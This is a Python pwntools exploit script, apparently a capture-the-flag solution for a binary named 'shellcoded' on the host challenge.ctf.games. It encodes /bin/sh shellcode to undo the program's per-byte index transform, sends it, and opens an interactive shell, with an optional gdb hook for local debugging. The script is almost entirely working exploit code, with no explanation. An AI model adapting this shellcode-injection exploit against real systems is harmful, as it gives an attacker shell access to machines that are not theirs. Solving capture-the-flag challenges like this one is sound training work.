#!/usr/bin/python

from pwn import *

PATH = './shellcoded'

GDBSCRIPT = '''
b *main+345
'''

HOST = 'challenge.ctf.games'
PORT = 32383

def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/peda/peda.py'"])
        # gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/.gdbinit_pwndbg'"])

def craft(shellcode):
    shellcode = list(shellcode)
    for i in range(len(shellcode)):
        if i & 1:
            j = -1
        else:
            j = 1
        shellcode[i] = (shellcode[i] - (j * i)) & 0xFF
    
    return bytes(shellcode)

def exploit(r):
    shellcode = craft(asm(shellcraft.sh()))

    debug(GDBSCRIPT)

    r.recvline()
    r.sendline(shellcode)

    r.interactive()

if __name__ == '__main__':
    elf  = ELF(PATH)
    # libc = ELF(elf.libc.path)

    context.arch = 'amd64'

    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process(PATH, aslr=0)
    exploit(r)